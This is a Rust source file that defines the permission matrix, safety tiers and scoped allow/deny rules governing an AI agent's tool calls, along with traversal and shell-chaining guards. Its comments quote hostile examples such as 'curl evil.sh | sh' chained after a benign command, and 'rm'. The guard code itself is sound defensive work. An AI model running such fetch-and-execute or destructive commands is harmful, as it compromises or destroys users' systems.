//! Safety tiers, permission cells, and the permission matrix — the single source
//! of truth for what each mode allows at each safety tier (RFC 0019 §3, #682/#699).
//!
//! Scoped permission rules (#712, RFC 0019 §9): argument-level matchers that
//! refine the matrix — e.g. allow writes under a specific path, deny certain
//! bash commands. Evaluated before overrides and the base matrix.

use crate::Mode;
use serde::{Deserialize, Serialize};
use ts_rs::TS;

/// How much trust a given tool invocation needs. The agent loop auto-runs
/// [`Safety::ReadOnly`] and defers higher tiers to the [`PermissionMatrix`].
///
/// Part of the IPC/settings surface (the Control-panel matrix, #702), exported to
/// TypeScript via `ts-rs`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, TS)]
#[serde(rename_all = "lowercase")]
#[ts(export, export_to = "../../../apps/desktop/src/bindings/")]
pub enum Safety {
    ReadOnly,
    Write,
    /// Read-ward externally-visible actions — network egress (`web_fetch`,
    /// `web_search`) and sub-agent spawn — that warrant a distinct trust tier
    /// between [`Write`] and [`Dangerous`] (#682). They read the outside world
    /// but do not publish to a remote system, so the default matrix prompts
    /// once in Plan and Auto and auto-approves in Act. (Contrast [`Publish`],
    /// which mutates a remote and is denied in Plan.)
    Sensitive,
    Dangerous,
    /// Remote-write / publish actions: `git push`, `gh pr merge`/`pr create`.
    /// A superset-risk of [`Sensitive`] — the egress *mutates* a remote system,
    /// so it must be hard-denied in an unattended/read-only context. Default
    /// matrix column is `[Deny, Ask, Allow]`: Plan denies, Auto prompts, Act
    /// auto-approves (#1051). Appended last so the safety index of the other
    /// tiers — and any persisted matrix — is unchanged.
    Publish,
}

/// What happens when a tool at a given [`Safety`] tier is invoked in a given
/// [`Mode`].
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, TS)]
#[serde(rename_all = "lowercase")]
#[ts(export, export_to = "../../../apps/desktop/src/bindings/")]
pub enum PermissionCell {
    /// Execute without prompting.
    Allow,
    /// Prompt the user for approval before executing.
    Ask,
    /// Tool is hidden from the model and cannot be invoked.
    Deny,
}

impl PermissionCell {
    pub fn is_allow(self) -> bool {
        self == Self::Allow
    }

    pub fn is_deny(self) -> bool {
        self == Self::Deny
    }
}

// ---------------------------------------------------------------------------
// Scoped permission rules (#712, RFC 0019 §9)
// ---------------------------------------------------------------------------

/// What a matched rule does.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum RuleEffect {
    Allow,
    Deny,
}

/// How a rule matches the resolved argument of a tool call.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum ArgMatcher {
    /// Glob on the resolved path argument (e.g. `src/**`, `*.rs`).
    PathGlob { pattern: String },
    /// Token-aware prefix on the bash command. `brazil-build` matches
    /// `brazil-build test` but NOT `brazil-build-evil`.
    CommandPrefix { prefix: String },
    /// Regex match on the full bash command string.
    CommandRegex { pattern: String },
}

/// Lexically normalize a workspace-relative path: collapse `.`, resolve `..`
/// against earlier components, and report whether the path escapes the root
/// (a leading `..` with nothing to pop, or an absolute path). No filesystem
/// access — purely textual, so it is safe to run on the approval hot path.
///
/// This is the guard for the scoped-rule traversal hole (#768 review B1):
/// without it, `globset`'s `**` happily matches `..` components, so an
/// `allow` scoped to `src/**` would auto-approve `src/../config/secret.toml`.
fn normalize_rel_path(p: &str) -> (String, bool) {
    // Absolute paths (or Windows drive-rooted) are not workspace-relative and
    // cannot be reasoned about against a relative glob — treat as escaping.
    let absolute = p.starts_with('/') || p.starts_with('\\') || p.contains(":\\");
    let mut out: Vec<&str> = Vec::new();
    let mut escaped = absolute;
    for comp in p.split(['/', '\\']) {
        match comp {
            "" | "." => continue,
            ".." => {
                if out.pop().is_none() {
                    escaped = true;
                }
            }
            other => out.push(other),
        }
    }
    (out.join("/"), escaped)
}

/// Shell control operators that turn a single command into a chain. An `allow`
/// rule scoped to a benign prefix (`cargo build`) must not auto-approve
/// `cargo build && curl evil.sh | sh` (#768 review B3), so any of these after
/// the prefix disqualifies the auto-approve and falls through to a prompt.
fn has_shell_control(s: &str) -> bool {
    s.contains("&&")
        || s.contains("||")
        || s.contains(';')
        || s.contains('|')
        || s.contains('`')
        || s.contains("$(")
        || s.contains('\n')
}

impl ArgMatcher {
    /// Whether this matcher's pattern is itself well-formed. Used to fail a
    /// malformed rule *closed* rather than silently swallowing the error
    /// (#768 review nit 2): a typo'd `deny` backstop must not quietly stop
    /// firing. `CommandPrefix` is always valid (a literal string).
    pub fn is_valid(&self) -> bool {
        match self {
            Self::PathGlob { pattern } => globset::Glob::new(pattern).is_ok(),
            Self::CommandPrefix { .. } => true,
            Self::CommandRegex { pattern } => regex::Regex::new(pattern).is_ok(),
        }
    }

    /// True for the command-prefix variant, which is the only one whose
    /// auto-approve must be gated on shell chaining.
    fn is_command_prefix(&self) -> bool {
        matches!(self, Self::CommandPrefix { .. })
    }

    /// Test whether `resolved` (the tool's relevant argument) matches this rule.
    /// Paths are lexically normalized first (traversal-safe); an invalid pattern
    /// returns `false` here — callers that need fail-closed semantics check
    /// [`ArgMatcher::is_valid`] separately.
    pub fn matches(&self, resolved: &str) -> bool {
        match self {
            Self::PathGlob { pattern } => {
                let (normalized, escaped) = normalize_rel_path(resolved);
                if escaped {
                    return false;
                }
                globset::Glob::new(pattern)
                    .map(|g| g.compile_matcher().is_match(&normalized))
                    .unwrap_or(false)
            }
            Self::CommandPrefix { prefix } => {
                // Token-aware: exact match OR prefix followed by a space.
                resolved == prefix.as_str() || resolved.starts_with(&format!("{prefix} "))
            }
            Self::CommandRegex { pattern } => regex::Regex::new(pattern)
                .map(|r| r.is_match(resolved))
                .unwrap_or(false),
        }
    }
}

/// A scoped permission rule: tool + argument matcher → effect.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PermissionRule {
    pub effect: RuleEffect,
    pub tool: String,
    pub matcher: ArgMatcher,
}

// ---------------------------------------------------------------------------

/// A 2-D lookup: [`Mode`] × [`Safety`] → [`PermissionCell`].
///
/// Persisted as JSON with `#[serde(default)]` so a missing or corrupt file
/// gracefully falls back to the RFC 0019 defaults without data loss.
use std::collections::HashMap;

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct PermissionMatrix {
    /// Row-major: `cells[mode_idx][safety_idx]`.
    cells: [[PermissionCell; 5]; 3],
    /// Per-tool overrides (#700, RFC 0019 §4.2). When set for a tool name, the
    /// override replaces the matrix cell for ALL mode×safety combinations involving
    /// that tool. `#[serde(default)]` ensures existing configs without this field
    /// load cleanly with an empty map.
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    overrides: HashMap<String, PermissionCell>,
    /// Scoped permission rules (#712, RFC 0019 §9). Evaluated before overrides
    /// and the base matrix. Deny rules always win; Allow rules never auto-clear
    /// Dangerous. `#[serde(default)]` keeps existing configs loading cleanly.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub rules: Vec<PermissionRule>,
}

impl Default for PermissionMatrix {
    /// RFC 0019 §3 default table:
    /// ```text
    ///          ReadOnly  Write  Sensitive  Dangerous  Publish
    /// Plan     Allow     Deny   Ask        Deny       Deny
    /// Auto     Allow     Allow  Ask        Deny       Ask
    /// Act      Allow     Allow  Allow      Ask        Allow
    /// ```
    ///
    /// Plan is a read-only planning mode: ReadOnly flies, Write/Dangerous are
    /// denied. Sensitive is `Ask` (not `Deny`) so read-shaped network tools
    /// (`web_fetch`/`web_search`) can be used for research behind a one-time
    /// approval — they carry no filesystem/repo mutation, only egress, which
    /// keeps its own URL-safety gate (#793). Publish (`git push`, `gh pr merge`)
    /// mutates a remote, so it is denied in Plan, prompted in Auto, and allowed
    /// in Act — `[Deny, Ask, Allow]`, a column no other tier provides (#1051).
    /// Note the cell array is ordered by [`safety_idx`]
    /// (`ReadOnly, Write, Sensitive, Dangerous, Publish`); Publish is appended
    /// last so a persisted `[_; 4]` matrix migrates by a pure append.
    fn default() -> Self {
        use PermissionCell::*;
        Self {
            cells: [
                // Plan
                [Allow, Deny, Ask, Deny, Deny],
                // Auto
                [Allow, Allow, Ask, Deny, Ask],
                // Act
                [Allow, Allow, Allow, Ask, Allow],
            ],
            overrides: HashMap::new(),
            rules: Vec::new(),
        }
    }
}

/// Custom deserialization with a 4→5 column migration (#1051). The `Publish`
/// tier was appended after `Dangerous`, so a matrix persisted before it existed
/// has 4-wide rows. Rather than let `serde` reject the shape — which, via the
/// loader's `.ok().unwrap_or_default()`, would silently reset a user's
/// customized matrix — pad each 4-wide row with the default `Publish` cell,
/// preserving the four columns the user did set. 5-wide rows load unchanged.
impl<'de> Deserialize<'de> for PermissionMatrix {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        #[derive(Deserialize)]
        #[serde(default)]
        struct Raw {
            cells: Vec<Vec<PermissionCell>>,
            overrides: HashMap<String, PermissionCell>,
            rules: Vec<PermissionRule>,
        }
        impl Default for Raw {
            fn default() -> Self {
                let d = PermissionMatrix::default();
                Raw {
                    cells: d.cells.iter().map(|row| row.to_vec()).collect(),
                    overrides: d.overrides,
                    rules: d.rules,
                }
            }
        }

        let raw = Raw::deserialize(deserializer)?;
        let default = PermissionMatrix::default();
        if raw.cells.len() != default.cells.len() {
            return Err(serde::de::Error::invalid_length(
                raw.cells.len(),
                &"3 permission-matrix rows (Plan, Auto, Act)",
            ));
        }
        let mut cells = default.cells;
        for (i, row) in raw.cells.into_iter().enumerate() {
            match row.len() {
                // Current shape: take verbatim.
                5 => cells[i].copy_from_slice(&row),
                // Pre-Publish shape: keep the four persisted cells, append the
                // default Publish column (already in `cells[i][4]`).
                4 => cells[i][..4].copy_from_slice(&row),
                other => {
                    return Err(serde::de::Error::invalid_length(
                        other,
                        &"4 (pre-Publish) or 5 permission-tier cells per row",
                    ));
                }
            }
        }
        Ok(PermissionMatrix {
            cells,
            overrides: raw.overrides,
            rules: raw.rules,
        })
    }
}

impl PermissionMatrix {
    pub fn cell(&self, mode: Mode, safety: Safety) -> PermissionCell {
        self.cells[mode_idx(mode)][safety_idx(safety)]
    }

    /// Resolve the effective permission for a tool call: per-tool override if set,
    /// otherwise the mode×safety matrix cell (#700, RFC 0019 §4.2).
    pub fn effective_cell(&self, tool: &str, mode: Mode, safety: Safety) -> PermissionCell {
        self.overrides
            .get(tool)
            .copied()
            .unwrap_or_else(|| self.cell(mode, safety))
    }

    pub fn set_cell(&mut self, mode: Mode, safety: Safety, value: PermissionCell) {
        self.cells[mode_idx(mode)][safety_idx(safety)] = value;
    }

    pub fn set_override(&mut self, tool: impl Into<String>, cell: PermissionCell) {
        self.overrides.insert(tool.into(), cell);
    }

    pub fn remove_override(&mut self, tool: &str) {
        self.overrides.remove(tool);
    }

    pub fn overrides(&self) -> &HashMap<String, PermissionCell> {
        &self.overrides
    }

    /// Evaluate scoped rules (#712) for a tool call. Returns the winning effect
    /// or `None` if no rule matches.
    ///
    /// Precedence: Deny > Allow (any Deny match vetoes all Allow matches).
    /// Allow rules only fire in Auto/Act (never Plan).
    /// Allow rules never auto-clear Dangerous (caller must degrade to Ask).
    pub fn evaluate_rules(
        &self,
        tool: &str,
        resolved_arg: Option<&str>,
        mode: Mode,
    ) -> Option<RuleEffect> {
        let resolved = resolved_arg?;
        let mut saw_allow = false;

        for rule in &self.rules {
            if rule.tool != tool {
                continue;
            }
            match rule.effect {
                RuleEffect::Deny => {
                    // Fail-closed (#768 review nit 2): a malformed deny pattern
                    // denies rather than silently never firing. Otherwise a
                    // matching deny vetoes unconditionally.
                    if !rule.matcher.is_valid() || rule.matcher.matches(resolved) {
                        return Some(RuleEffect::Deny);
                    }
                }
                RuleEffect::Allow => {
                    // A malformed allow never auto-approves.
                    if !rule.matcher.is_valid() || !rule.matcher.matches(resolved) {
                        continue;
                    }
                    // Never auto-approve a shell-chained command (#768 review B3):
                    // an allow for `cargo build` must not clear `cargo build && rm`.
                    if rule.matcher.is_command_prefix() && has_shell_control(resolved) {
                        continue;
                    }
                    saw_allow = true;
                }
            }
        }

        if saw_allow {
            // Allow rules never fire in Plan mode.
            if mode == Mode::Plan {
                return None;
            }
            return Some(RuleEffect::Allow);
        }

        None
    }

    /// Validate every rule's matcher pattern, returning `(index, error)` for
    /// each malformed one. Call at load time and surface the errors (#768
    /// review nit 2) rather than letting a typo silently disable a backstop.
    pub fn validate_rules(&self) -> Vec<(usize, String)> {
        self.rules
            .iter()
            .enumerate()
            .filter_map(|(i, rule)| match &rule.matcher {
                ArgMatcher::PathGlob { pattern } => globset::Glob::new(pattern)
                    .err()
                    .map(|e| (i, format!("invalid path_glob `{pattern}`: {e}"))),
                ArgMatcher::CommandRegex { pattern } => regex::Regex::new(pattern)
                    .err()
                    .map(|e| (i, format!("invalid command_regex `{pattern}`: {e}"))),
                ArgMatcher::CommandPrefix { .. } => None,
            })
            .collect()
    }
    /// Flatten the matrix into a self-describing list (Mode × Safety → cell), the
    /// shape the Control panel consumes so the FE never depends on the private
    /// index ordering (#702).
    pub fn entries(&self) -> Vec<PermissionMatrixEntry> {
        const MODES: [Mode; 3] = [Mode::Plan, Mode::Auto, Mode::Act];
        const SAFETIES: [Safety; 5] = [
            Safety::ReadOnly,
            Safety::Write,
            Safety::Sensitive,
            Safety::Dangerous,
            Safety::Publish,
        ];
        let mut cells = Vec::with_capacity(MODES.len() * SAFETIES.len());
        for mode in MODES {
            for safety in SAFETIES {
                cells.push(PermissionMatrixEntry {
                    mode,
                    safety,
                    cell: self.cell(mode, safety),
                });
            }
        }
        cells
    }

    /// The per-tool overrides (#700) as a self-describing, deterministically
    /// ordered list — the shape the Control panel consumes.
    pub fn override_entries(&self) -> Vec<PermissionOverrideEntry> {
        let mut entries: Vec<PermissionOverrideEntry> = self
            .overrides
            .iter()
            .map(|(tool, &cell)| PermissionOverrideEntry {
                tool: tool.clone(),
                cell,
            })
            .collect();
        entries.sort_by(|a, b| a.tool.cmp(&b.tool));
        entries
    }

    /// The wire view of the matrix, for `get_permission_matrix` (#702): the full
    /// Mode × Safety grid plus the per-tool overrides (#700).
    pub fn view(&self) -> PermissionMatrixView {
        PermissionMatrixView {
            cells: self.entries(),
            overrides: self.override_entries(),
        }
    }
}

/// One flattened matrix cell: which [`PermissionCell`] applies at a given
/// [`Mode`] × [`Safety`]. Part of the IPC surface (#702).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, TS)]
#[ts(export, export_to = "../../../apps/desktop/src/bindings/")]
pub struct PermissionMatrixEntry {
    pub mode: Mode,
    pub safety: Safety,
    pub cell: PermissionCell,
}

/// One per-tool override (#700): the [`PermissionCell`] that replaces the matrix
/// cell for a named tool across all Mode × Safety combinations. Part of the IPC
/// surface (#702).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, TS)]
#[ts(export, export_to = "../../../apps/desktop/src/bindings/")]
pub struct PermissionOverrideEntry {
    pub tool: String,
    pub cell: PermissionCell,
}

/// The Control panel's view of the permission state (#702): the full matrix as a
/// flat cell list, plus the per-tool overrides (#700).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, TS)]
#[ts(export, export_to = "../../../apps/desktop/src/bindings/")]
pub struct PermissionMatrixView {
    pub cells: Vec<PermissionMatrixEntry>,
    #[serde(default)]
    pub overrides: Vec<PermissionOverrideEntry>,
}

fn mode_idx(mode: Mode) -> usize {
    match mode {
        Mode::Plan => 0,
        Mode::Auto => 1,
        Mode::Act => 2,
    }
}

fn safety_idx(safety: Safety) -> usize {
    match safety {
        Safety::ReadOnly => 0,
        Safety::Write => 1,
        Safety::Sensitive => 2,
        Safety::Dangerous => 3,
        Safety::Publish => 4,
    }
}

/// The synchronous, pre-prompt decision for a tool call (#828 Part C, #829 review).
/// Pure — no AppHandle, no async, no state beyond the inputs. Testable directly,
/// so a regression that reorders the allowlist above the Deny gate is caught.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PrePromptDecision {
    /// The matrix denies this call outright (e.g. Plan x Write).
    Deny,
    /// Auto-approved (allowlist hit, scoped Allow rule, or matrix Allow cell).
    Allow,
    /// None of the sync gates resolved it — prompt the user asynchronously.
    Prompt,
}

/// Resolve the "relevant argument" a scoped permission rule matches on (#712).
///
/// Each entry is verified against the real tool arg schema in `ff-tools`
/// (#768 review B2): `bash` takes `command`, `python` takes `code`, and the
/// filesystem mutators take `path`. Only tools that can actually reach the
/// approval gate are listed — the read-only search tools (`glob`, `grep`)
/// short-circuit as `Safety::ReadOnly` before `approve()`, so a rule on them
/// would never fire; listing them (with the wrong key) was dead, misleading
/// code.
///
/// This lives beside [`pre_prompt_decision`] rather than inside any one
/// `Approver` because every approver must resolve the same key for the same
/// tool. Feeding [`PermissionMatrix::evaluate_rules`] a `None` it did not earn
/// makes that function return early, which skips **every** scoped rule
/// including `Deny` — fail-open. #768 warned about it for a *wrong* key; #1059
/// T4's Slack approver hit the same hole by passing `None` outright, which is
/// why this is shared code now (#1168 review, finding 1).
pub fn resolve_tool_arg(name: &str, args: &serde_json::Value) -> Option<String> {
    let key = match name {
        "bash" => "command",
        "python" => "code",
        "view" | "edit" | "write" => "path",
        _ => return None,
    };
    args.get(key).and_then(|v| v.as_str()).map(Into::into)
}

/// Evaluate the synchronous approval gates in their canonical order (#827):
/// 1. Matrix Deny is absolute (no override).
/// 2. Allowlist accelerates Ask cells.
/// 3. Scoped rules (Deny vetoes; Allow approves unless Dangerous).
/// 4. Matrix Allow auto-approves; Ask falls through to Prompt.
pub fn pre_prompt_decision(
    cell: PermissionCell,
    allowlisted: bool,
    scoped_effect: Option<RuleEffect>,
    safety: Safety,
) -> PrePromptDecision {
    if cell.is_deny() {
        return PrePromptDecision::Deny;
    }
    if allowlisted {
        return PrePromptDecision::Allow;
    }
    match scoped_effect {
        Some(RuleEffect::Deny) => return PrePromptDecision::Deny,
        // Intentional asymmetry with the `allowlisted` grant above (#1051): a
        // coarse session/always allowlist entry keys on tool+safety and would
        // blanket-cover EVERY Publish call for that tool, so `allowlist_covers`
        // excludes Publish (and Dangerous). A scoped rule (#700, RFC 0019 §4.2)
        // is different -- the user wrote a persistent rule naming the command
        // (e.g. `bash` + CommandPrefix "git"), so honoring it for Publish is a
        // deliberate, named authorization, not a blanket one. Dangerous is still
        // never auto-allowed by a scoped rule (force-push, `rm -rf`, ...), so the
        // genuinely destructive tier always prompts.
        Some(RuleEffect::Allow) if safety != Safety::Dangerous => {
            return PrePromptDecision::Allow;
        }
        _ => {}
    }
    match cell {
        PermissionCell::Allow => PrePromptDecision::Allow,
        PermissionCell::Deny => PrePromptDecision::Deny, // unreachable (handled above)
        PermissionCell::Ask => PrePromptDecision::Prompt,
    }
}

#[cfg(test)]
mod tests;
